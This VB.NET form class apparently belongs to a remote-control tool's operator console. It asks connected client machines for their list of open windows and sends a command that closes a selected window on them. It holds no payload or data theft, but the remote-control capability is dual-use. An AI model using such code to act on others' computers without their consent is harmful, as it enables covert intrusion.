Imports System.ComponentModel
Imports System.Runtime.InteropServices

Public Class Form42
    Dim rr As New TextBox
    Dim KKKKS As New TextBox
    Public xxx As Integer
    Dim state As Integer
    Dim time As Integer
    Public WithEvents bw As BackgroundWorker = New BackgroundWorker

    <DllImport("uxtheme", CharSet:=CharSet.Unicode)>
    Public Shared Function SetWindowTheme(ByVal hWnd As IntPtr, ByVal textSubAppName As String, ByVal textSubIdList As String) As Integer
    End Function
    Private Sub Form42_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ContextMenuStrip1.Renderer = New clsVistaToolStripRenderer
        rr.Text = 1
        Timer3.Enabled = True
        Me.Opacity = 0.8R
        HuraAlertBox1.Show()
        SetWindowTheme(ListView1.Handle, "explorer", Nothing)

        Form1.S.Send(xxx, "Winsx")




        If state = 1 Then

            Timer1.Interval = time
            Timer1.Start()
        Else

            Timer1.Stop()
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ListView1.Items.Clear()
        If Not bw.IsBusy = True Then
            bw.RunWorkerAsync()

        End If
    End Sub

    Private Sub ListView1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListView1.SelectedIndexChanged
        KKKKS.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text
        'MsgBox(KKKKS.Text)
    End Sub

    Private Sub KillToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillToolStripMenuItem.Click




        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "KLACt" & "|U|" & KKKKS.Text)
            ListView1.Items.Clear()
            Form1.S.Send(xxx, "Winsx")
        Next


    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        rr.Text = 1
        Timer3.Enabled = True
        Me.Opacity = 0.8R
        HuraAlertBox1.Show()
        ListView1.Items.Clear()
        Form1.S.Send(xxx, "Winsx")
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Dim C As String
        C = ListView1.Items.Count.ToString
        ToolStripStatusLabel1.Text = "ActiveWindows(" & C & ")"
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        rr.Text += 1
        HuraAlertBox1.Show()
        If rr.Text = 5 Then
            Me.Opacity = 9.9R
            HuraAlertBox1.Hide()
            Timer3.Enabled = False
        End If
    End Sub


End Class